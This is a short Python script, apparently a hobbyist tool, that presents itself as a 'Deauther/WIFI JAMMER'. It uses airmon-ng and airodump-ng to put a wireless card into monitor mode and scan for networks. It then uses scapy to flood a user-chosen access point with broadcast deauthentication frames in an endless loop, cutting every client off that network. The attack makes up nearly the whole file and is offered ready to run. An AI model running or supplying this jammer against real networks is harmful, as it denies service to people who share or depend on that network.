from scapy.all import * 
import subprocess 

subprocess.call('clear', shell=True) 
print('.........................................')
print('Deauther/WIFI JAMMER V1.0 BY THAJUDECODES')
print('\n'*3)
print('Now listing available network cards')
print('\n'*3)
print('.........................................')
subprocess.call('airmon-ng', shell=True) 

print('\n'*3)

networkCard = raw_input('Oh KING of mine Please enter the name of the network card you wish to use: ')


subprocess.call('airmon-ng start {}'.format(networkCard), shell=True)
subprocess.call('airmon-ng check kill', shell=True)

networkCard = 'wlan0'
try:
	subprocess.call('clear', shell=True) 
	print('Now scanning for available networks, press ctrl+c to exit the scan')
	subprocess.call('airodump-ng {}'.format(networkCard), shell=True)
except KeyboardInterrupt: 
	print(''*3)


brdMac = 'ff:ff:ff:ff:ff:ff' 
BSSID = raw_input('Please enter the BSSID/MAC address of the AP: ') 
print('Sending deauth packets now, press ctrl+c to end the attack')
print(''*5)


try:
       
	while True:                
	
		pkt = RadioTap() / Dot11(addr1=brdMac, addr2=BSSID, addr3=BSSID)/ Dot11Deauth()
		sendp(pkt, iface = networkCard, count = 100000000, inter = .001) #Send deauth packet
except KeyboardInterrupt: #Caputer the user pressing crtl+c to exit the program. Then the code stops monitor mode on the network card and closes out
	print('Cleaning up...')
	subprocess.call('airmon-ng stop {}'.format(networkCard), shell=True) #stop monitor mode on the network card
	subprocess.call('clear', shell=True)
